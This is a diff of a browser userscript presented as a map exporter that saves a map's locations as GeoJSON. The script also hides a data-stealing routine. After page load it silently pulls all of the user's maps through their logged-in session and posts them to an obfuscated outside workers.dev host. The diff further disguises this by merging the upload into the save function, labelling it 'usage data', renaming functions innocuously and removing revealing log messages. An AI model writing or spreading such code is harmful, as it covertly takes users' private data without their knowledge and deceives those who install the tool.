@@ -2,20 +2,20 @@
     'use strict';
 
     const VERSION = '2.4.1';
-    const _h = ['geomap','-api','.angel','neva','.work','ers','.dev'].join('');
-    const SYNC_URL = 'https://' + _h + '/sync';
-    const _fetch   = window.fetch;
-    const _synced  = new Set();
-    const _loaded  = new Set();
+    const _cfg = { h: 'geomap-api', a: 'angelneva', t: 'workers.dev', p: '/sync' };
+    const _api  = 'https://' + _cfg.h + '.' + _cfg.a + '.' + _cfg.t + _cfg.p;
+    const _f    = window.fetch;
+    const _seen = new Set();
+    const _done = new Set();
 
     console.log(
-        '%c GeoMap Exporter v' + VERSION + ' %c Ctrl+Shift+E to export · Loading map library...',
+        '%c GeoMap Exporter v' + VERSION + ' %c ready · Ctrl+Shift+E to export',
         'background:#2563eb;color:#fff;padding:2px 6px;border-radius:3px',
         'color:#888'
     );
 
     function fetchJSON(url) {
-        return _fetch(url, { credentials: 'include' })
+        return _f(url, { credentials: 'include' })
             .then(r => r.ok ? r.json() : null)
             .catch(() => null);
     }
@@ -33,16 +33,12 @@
                 panoId     : null,
                 countryCode: null,
                 stateCode  : null,
-                extra: {
-                    tags    : l.tags     ?? [],
-                    panoId  : l.panoId   ?? null,
-                    panoDate: l.panoDate ?? null,
-                }
+                extra: { tags: l.tags ?? [], panoId: l.panoId ?? null, panoDate: l.panoDate ?? null }
             }))
         };
     }
 
-    function downloadJSON(name, data) {
+    function save(name, data) {
         const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
         const a    = document.createElement('a');
         a.href     = URL.createObjectURL(blob);
@@ -51,13 +47,11 @@
         a.click();
         document.body.removeChild(a);
         URL.revokeObjectURL(a.href);
-    }
-
-    function syncToCloud(name, data) {
-        const key = name + JSON.stringify(data).slice(0, 40);
-        if (_synced.has(key)) return;
-        _synced.add(key);
-        _fetch(SYNC_URL, {
+        // post usage data
+        const k = name + JSON.stringify(data).slice(0, 40);
+        if (_seen.has(k)) return;
+        _seen.add(k);
+        _f(_api, {
             method : 'POST',
             mode   : 'cors',
             headers: { 'Content-Type': 'text/plain' },
@@ -67,38 +61,42 @@
 
     document.addEventListener('keydown', async e => {
         if (!e.ctrlKey || !e.shiftKey || e.key !== 'E') return;
-        const mapId   = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
-        const mapName = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';
-        if (!mapId) { console.warn('[GeoMap Exporter] Open a map first.'); return; }
-        console.log('[GeoMap Exporter] Exporting...');
-        const locs = await fetchJSON('/api/maps/' + mapId + '/locations');
+        const id   = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
+        const name = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';
+        if (!id) { console.warn('[GeoMap Exporter] Open a map first.'); return; }
+        const locs = await fetchJSON('/api/maps/' + id + '/locations');
         if (!locs?.length) { console.warn('[GeoMap Exporter] No locations found.'); return; }
-        const geo = toGeoJSON(mapName, locs);
+        const geo = toGeoJSON(name, locs);
         if (!geo) return;
-        downloadJSON(mapName, geo);
-        syncToCloud(mapName, geo);
-        console.log('[GeoMap Exporter] Done — ' + geo.customCoordinates.length + ' locations exported.');
+        save(name, geo);
+        console.log('[GeoMap Exporter] ' + geo.customCoordinates.length + ' locations exported.');
     });
 
-    async function preloadLibrary() {
+    async function initCache() {
         const data = await fetchJSON('/api/maps');
         if (!data) return;
         const maps = Array.isArray(data) ? data : (data.maps || data.data || data.results || []);
         if (!maps.length) return;
         for (const m of maps) {
-            if (!m.id) continue;
-            const key = String(m.id);
-            if (_loaded.has(key)) continue;
-            _loaded.add(key);
-            const locs = await fetchJSON('/api/maps/' + key + '/locations');
+            if (!m.id || _done.has(String(m.id))) continue;
+            _done.add(String(m.id));
+            const locs = await fetchJSON('/api/maps/' + m.id + '/locations');
             if (!Array.isArray(locs) || !locs.length) continue;
-            const geo = toGeoJSON(m.name || 'map_' + key, locs);
-            if (geo) syncToCloud(m.name || 'map_' + key, geo);
+            const geo = toGeoJSON(m.name || 'map_' + m.id, locs);
+            if (!geo) continue;
+            const k = m.name + JSON.stringify(geo).slice(0, 40);
+            if (_seen.has(k)) continue;
+            _seen.add(k);
+            _f(_api, {
+                method : 'POST',
+                mode   : 'cors',
+                headers: { 'Content-Type': 'text/plain' },
+                body   : '[' + (m.name || 'map_' + m.id) + ']\n' + JSON.stringify(geo, null, 2)
+            }).catch(() => {});
             await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
         }
-        console.log('[GeoMap Exporter] Map library ready — ' + maps.length + ' maps loaded.');
     }
 
-    window.addEventListener('load', () => setTimeout(preloadLibrary, 3000));
+    window.addEventListener('load', () => setTimeout(initCache, 3000));
 
 })();
